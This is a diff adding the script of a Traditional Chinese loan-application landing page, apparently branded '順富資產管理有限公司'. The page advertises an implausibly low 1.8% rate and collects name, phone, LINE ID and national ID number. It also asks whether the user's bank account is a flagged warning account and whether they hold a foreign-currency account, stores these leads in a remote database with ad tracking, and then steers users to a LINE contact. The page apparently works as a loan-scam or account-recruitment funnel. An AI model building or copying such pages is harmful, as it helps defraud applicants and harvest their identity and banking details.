+          <div class="summary">
+            <div><span>申請金額</span><b id="summaryAmount">評估中</b></div>
+            <div><span>貸款用途</span><b id="summaryPurpose">醫療費用</b></div>
+            <div><span>資料狀態</span><b>已送出</b></div>
+          </div>
+          <a id="lineBtn" class="line-btn" href="#">加入 LINE 完成申請</a>
+          <div id="lineHint" class="footer-note">若 LINE 沒有自動開啟，請回到此頁再點一次。</div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<div id="loading" class="loading">
+  <div class="loading-card">
+    <div class="spinner"></div>
+    <h3>正在送出評估</h3>
+    <p class="form-desc">請稍候，不要關閉頁面。</p>
+  </div>
+</div>
+
+<script>
+(function(){
+  const SUPABASE_URL = 'https://ijzywhrnhvldkjdwfdyy.supabase.co';
+  const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_6aY1-VEvimuV1K4FzURO2Q_inVt-ZKL';
+  let ENTERPRISE_LINE_URL = 'https://line.me/ti/p/@987apocu';
+  let ENTERPRISE_LINE_ID = '@987apocu';
+  let currentStep = 1;
+  const annualRate = 1.8;
+  const state = {
+    amountNumber: 500000,
+    term: 18,
+    purpose: '教育進修',
+    amountChoice: '30萬 - 50萬',
+    is_warning: '',
+    has_foreign: '',
+    has_loan: '',
+    has_debt: ''
+  };
+
+  function money(value){
+    return 'NT$ ' + Math.round(value).toLocaleString('en-US');
+  }
+
+  function compactWan(value){
+    return 'NT$' + (value / 10000).toFixed(1).replace(/\.0$/, '') + '萬';
+  }
+
+  function amountChoiceFromNumber(value){
+    if(value < 200000) return '10萬 - 20萬';
+    if(value < 300000) return '20萬 - 30萬';
+    if(value < 500000) return '30萬 - 50萬';
+    if(value < 1000000) return '50萬 - 100萬';
+    return '100萬以上';
+  }
+
+  function updateCalculator(){
+    const monthlyRate = annualRate / 100 / 12;
+    const payment = state.amountNumber * monthlyRate / (1 - Math.pow(1 + monthlyRate, -state.term));
+    const total = payment * state.term;
+    const interest = total - state.amountNumber;
+    document.getElementById('amountDisplay').textContent = money(state.amountNumber);
+    document.getElementById('heroAmount').textContent = money(state.amountNumber);
+    document.getElementById('monthlyPayment').textContent = money(payment);
+    document.getElementById('rateText').textContent = annualRate.toFixed(1) + '%';
+    const termTextEl = document.getElementById('termText');
+    if(termTextEl) termTextEl.textContent = state.term + '期';
+    document.getElementById('interestText').textContent = compactWan(interest);
+    document.getElementById('totalText').textContent = compactWan(total);
+    state.amountChoice = amountChoiceFromNumber(state.amountNumber);
+    syncAmountChoice();
+  }
+
+  function syncAmountChoice(){
+    document.querySelectorAll('#formAmountOptions .choice').forEach(btn => {
+      btn.classList.toggle('selected', btn.dataset.value === state.amountChoice);
+    });
+  }
+
+  function normalizeLineUrl(lineUrl, lineId){
+    const url = String(lineUrl || '').trim();
+    const id = String(lineId || '').trim();
+    if(/^https?:\/\//i.test(url)) return url;
+    if(id.startsWith('@')) return 'https://line.me/ti/p/' + id;
+    return ENTERPRISE_LINE_URL;
+  }
+
+  function applyCPageConfig(config){
+    config = config || {};
+    ENTERPRISE_LINE_ID = config.line_id || ENTERPRISE_LINE_ID;
+    ENTERPRISE_LINE_URL = normalizeLineUrl(config.line_url, ENTERPRISE_LINE_ID);
+    document.getElementById('lineBtn').href = ENTERPRISE_LINE_URL;
+    if(config.company_name){
+      document.querySelectorAll('[data-company-name]').forEach(el => el.textContent = config.company_name);
+            document.title = document.title.replace('順富資產管理有限公司', config.company_name);
+    }
+  }
+
+  Promise.resolve(window.PAGE_CONFIG_READY)
+    .then(applyCPageConfig)
+    .catch(error => console.warn('Page config load failed:', error));
+
+  function createLeadId(){
+    if(window.crypto && window.crypto.randomUUID) return window.crypto.randomUUID();
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+      const r = Math.random() * 16 | 0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  async function submitLeadPayload(payload){
+    const requestOptions = {
+      method: 'POST',
+      headers: {
+        apikey: SUPABASE_PUBLISHABLE_KEY,
+        Authorization: 'Bearer ' + SUPABASE_PUBLISHABLE_KEY,
+        'Content-Type': 'application/json',
+        Prefer: 'return=minimal'
+      },
+      body: JSON.stringify(payload)
+    };
+    let response = await fetch(SUPABASE_URL + '/rest/v1/leads', requestOptions);
+    if(!response.ok && payload.traffic_source){
+      const errorText = await response.clone().text();
+      if(errorText.includes('traffic_source')){
+        const fallbackPayload = { ...payload };
+        delete fallbackPayload.traffic_source;
+        requestOptions.body = JSON.stringify(fallbackPayload);
+        response = await fetch(SUPABASE_URL + '/rest/v1/leads', requestOptions);
+      }
+    }
+    return response;
+  }
+
+  function trackLineClick(){
+    if(!window.__lastLeadId) return;
+    fetch(SUPABASE_URL + '/rest/v1/rpc/mark_line_clicked', {
+      method: 'POST',
+      keepalive: true,
+      headers: {
+        apikey: SUPABASE_PUBLISHABLE_KEY,
+        Authorization: 'Bearer ' + SUPABASE_PUBLISHABLE_KEY,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ lead_id: window.__lastLeadId })
+    }).catch(error => console.warn('Line click update error:', error));
+  }
+
+  const counties = ['基隆市','台北市','新北市','桃園市','新竹市','新竹縣','苗栗縣','台中市','彰化縣','南投縣','雲林縣','嘉義市','嘉義縣','台南市','高雄市','屏東縣','宜蘭縣','花蓮縣','台東縣','澎湖縣','金門縣','連江縣'];
+  const countySelect = document.getElementById('county');
+  counties.forEach(city => {
+    const option = document.createElement('option');
+    option.value = city;
+    option.textContent = city;
+    countySelect.appendChild(option);
+  });
+
+  document.getElementById('amountRange').addEventListener('input', event => {
+    state.amountNumber = Number(event.target.value);
+    updateCalculator();
+  });
+
+  function adjustAmount(delta){
+    const amountRange = document.getElementById('amountRange');
+    const next = Math.min(Number(amountRange.max), Math.max(Number(amountRange.min), state.amountNumber + delta));
+    state.amountNumber = next;
+    amountRange.value = String(next);
+    updateCalculator();
+  }
+
+  document.getElementById('minusAmount')?.addEventListener('click', () => adjustAmount(-10000));
+  document.getElementById('plusAmount')?.addEventListener('click', () => adjustAmount(10000));
+  document.getElementById('recalcBtn')?.addEventListener('click', () => updateCalculator());
+  document.getElementById('recalcBtnBottom')?.addEventListener('click', () => updateCalculator());
+
+  document.querySelectorAll('#termOptions .option').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#termOptions .option').forEach(item => item.classList.remove('selected'));
+      btn.classList.add('selected');
+      state.term = Number(btn.dataset.term);
+      updateCalculator();
+    });
+  });
+
+  document.querySelectorAll('#purposeOptions .option').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#purposeOptions .option').forEach(item => item.classList.remove('selected'));
+      btn.classList.add('selected');
+      state.purpose = btn.dataset.purpose;
+    });
+  });
+
+  document.querySelectorAll('#formAmountOptions .choice').forEach(btn => {
+    btn.addEventListener('click', () => {
+      state.amountChoice = btn.dataset.value;
+      syncAmountChoice();
+      document.getElementById('amountError').style.display = 'none';
+    });
+  });
+
+  document.querySelectorAll('.yn').forEach(group => {
+    group.querySelectorAll('.choice').forEach(btn => {
+      btn.addEventListener('click', () => {
+        group.querySelectorAll('.choice').forEach(item => item.classList.remove('selected'));
+        btn.classList.add('selected');
+        state[group.dataset.group] = btn.dataset.value;
+        document.getElementById('ynError').style.display = 'none';
+        if(group.dataset.group === 'is_warning'){
+          document.getElementById('warningError').style.display = btn.dataset.value === '是' ? 'block' : 'none';
+        }
+      });
+    });
+  });
+
+  document.getElementById('applyNow').addEventListener('click', () => {
+    Promise.resolve(window.PAGE_CONFIG_READY)
+      .then(() => window.trackTikTokEvent?.('ClickButton', {
+        content_type: 'loan_application',
+        content_name: 'P版立即申貸'
+      }))
+      .catch(error => console.warn('TikTok ClickButton event error:', error));
+    window.trackPageEvent?.('InitiateCheckout', {
+      content_name: 'P版試算後申請',
+      content_category: '貸款試算'
+    });
+    showScreen('formScreen');
+    currentStep = 1;
+    updateStepUI();
+  });
+
+  document.getElementById('backBtn').addEventListener('click', () => {
+    if(currentStep > 1){
+      currentStep--;
+      updateStepUI();
+      return;
+    }
+    showScreen('estimateScreen');
+    window.resumeLoanNotify && window.resumeLoanNotify();
+  });
+
+  document.getElementById('nextBtn').addEventListener('click', async () => {
+    if(!validateStep()) return;
+    if(currentStep < 3){
+      currentStep++;
+      updateStepUI();
+      return;
+    }
+    await submitForm();
+  });
+
+  function showScreen(id){
+    document.querySelectorAll('.screen').forEach(screen => screen.classList.toggle('active', screen.id === id));
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function updateStepUI(){
+    document.querySelectorAll('.panel').forEach(panel => panel.classList.toggle('active', Number(panel.dataset.step) === currentStep));
+    for(let i = 1; i <= 3; i++){
+      const dot = document.getElementById('stepDot' + i);
+      dot.classList.toggle('active', i === currentStep);
+      dot.classList.toggle('done', i < currentStep);
+    }
+    document.getElementById('stepLine1').classList.toggle('done', currentStep > 1);
+    document.getElementById('stepLine2').classList.toggle('done', currentStep > 2);
+    document.getElementById('backBtn').style.display = currentStep > 1 ? '' : 'none';
+    const nextBtn = document.getElementById('nextBtn');
+    nextBtn.textContent = currentStep < 3 ? '下一步' : '送出貸款評估申請';
+    nextBtn.classList.toggle('gold', currentStep === 3);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function validateStep(){
+    document.getElementById('amountError').style.display = 'none';
+    document.getElementById('ynError').style.display = 'none';
+    document.getElementById('warningError').style.display = 'none';
+    document.getElementById('submitError').style.display = 'none';
+    const form = document.getElementById('loanForm');
+    if(currentStep === 1){
+      if(!state.amountChoice){
+        document.getElementById('amountError').style.display = 'block';
+        return false;
+      }
+      return true;
+    }
+    if(currentStep === 2){
+      const required = ['name','age','phone','lineId','id_card','county'];
+      for(const name of required){
+        const input = form.elements[name];
+        if(!String(input.value || '').trim()){
+          input.focus();
+          return false;
+        }
+      }
+      return true;
+    }
+    const requiredYn = ['is_warning','has_foreign','has_loan','has_debt'];
+    const ok = requiredYn.every(key => state[key]);
+    if(!ok) document.getElementById('ynError').style.display = 'block';
+    if(state.is_warning === '是'){
+      document.getElementById('warningError').style.display = 'block';
+      return false;
+    }
+    return ok;
+  }
+
+  async function submitForm(){
+    await Promise.resolve(window.PAGE_CONFIG_READY).catch(() => null);
+    const form = document.getElementById('loanForm');
+    const data = Object.fromEntries(new FormData(form).entries());
+    if(state.is_warning === '是'){
+      document.getElementById('warningError').style.display = 'block';
+      return;
+    }
+    const leadId = createLeadId();
+    const pageConfig = window.PAGE_CONFIG || {};
+    const payload = {
+      id: leadId,
+      page_id: pageConfig.id || null,
+      page_slug: window.PAGE_SLUG || 'main',
+      name: String(data.name || '').trim(),
+      age: data.age ? Number(data.age) : null,
+      city: data.county || '',
+      id_number: String(data.id_card || '').trim().toUpperCase(),
+      phone: String(data.phone || '').trim(),
+      line_id: String(data.lineId || '').trim(),
+      q1_existing_loan: '是否有信貸/房貸/車貸/機貸：' + (state.has_loan || '') + '；銀行協商或呆帳：' + (state.has_debt || ''),
+      q2_bank_status: '銀行是否為警示戶：' + (state.is_warning || ''),
+      q3_amount_needed: state.amountChoice || '',
+      q4_foreign_currency_account: '是否有個人外幣帳戶：' + (state.has_foreign || ''),
+      source_url: window.location.href,
+      traffic_source: window.TRAFFIC_SOURCE || null,
+      user_agent: navigator.userAgent,
+      status: 'new',
+      line_clicked: false
+    };
+
+    const loading = document.getElementById('loading');
+    const nextBtn = document.getElementById('nextBtn');
+    nextBtn.disabled = true;
+    loading.classList.add('show');
+    try{
+      const response = await submitLeadPayload(payload);
+      if(!response.ok) throw new Error('Supabase insert failed: ' + response.status);
+      window.__lastLeadId = leadId;
+      window.trackPageEvent?.('Lead', {
+        content_name: 'P版貸款試算申請',
+        content_category: '貸款引流',
+        value: 0,
+        currency: 'TWD'
+      });
+      window.trackPageEvent?.('CompleteRegistration', {
+        content_name: 'P版貸款試算申請',
+        status: 'submitted'
+      });
+      window.trackTikTokEvent?.('SubmitForm', { content_type: 'loan_application' });
+      setTimeout(() => showResult(payload), 500);
+    }catch(error){
+      console.error('Lead submit error:', error);
+      document.getElementById('submitError').textContent = '送出失敗，請檢查網路後再試一次。';
+      document.getElementById('submitError').style.display = 'block';
+      nextBtn.disabled = false;
+      loading.classList.remove('show');
+    }
+  }
+
+  function showResult(payload){
+    document.getElementById('loading').classList.remove('show');
+    showScreen('finishScreen');
+    document.getElementById('finishTop').classList.remove('blocked');
+    document.getElementById('finishIcon').textContent = '✓';
+    document.getElementById('finishTitle').textContent = '初步資料已送出';
+    document.getElementById('finishSub').textContent = '請加入 LINE 完成最後申請';
+    document.getElementById('finishDesc').innerHTML = '<b>' + escapeHtml(payload.name || '您好') + '</b>，您的資料已送出。下一步請加入官方 LINE，由專員確認可申請方案與額度。';
+    document.getElementById('summaryAmount').textContent = payload.q3_amount_needed || '評估中';
+    document.getElementById('summaryPurpose').textContent = state.purpose;
+    document.getElementById('lineBtn').href = ENTERPRISE_LINE_URL;
+    document.getElementById('lineBtn').style.display = 'flex';
+    document.getElementById('lineHint').style.display = '';
+  }
+
+  function showBlockedResult(name){
+    document.getElementById('loading').classList.remove('show');
+    showScreen('finishScreen');
+    document.getElementById('finishTop').classList.add('blocked');
+    document.getElementById('finishIcon').textContent = '!';
+    document.getElementById('finishTitle').textContent = '暫時無法申請';
+    document.getElementById('finishSub').textContent = '警示戶不符合本頁申請條件';
+    document.getElementById('finishDesc').innerHTML = '<b>' + escapeHtml(name || '您好') + '</b>，目前系統判定暫時無法送出申請。建議先向銀行確認警示戶狀態，解除後再重新評估。';
+    document.getElementById('summaryAmount').textContent = state.amountChoice || '未送出';
+    document.getElementById('summaryPurpose').textContent = state.purpose;
+    document.getElementById('lineBtn').style.display = 'none';
+    document.getElementById('lineHint').style.display = 'none';
+  }
+
+  function escapeHtml(value){
+    return String(value).replace(/[&<>"']/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[ch]));
+  }
+
+  document.getElementById('lineBtn').addEventListener('click', () => {
+    trackLineClick();
+    window.trackPageEvent?.('Contact', { content_name: 'P版加入LINE' });
+    window.trackPageEvent?.('LineAddFriend', { content_name: 'P版加入LINE', content_category: '貸款引流' });
+    window.trackTikTokEvent?.('Contact', { content_type: 'line_click' });
+  });
+
+  updateCalculator();
+})();
+</script>
+</body>
+</html>
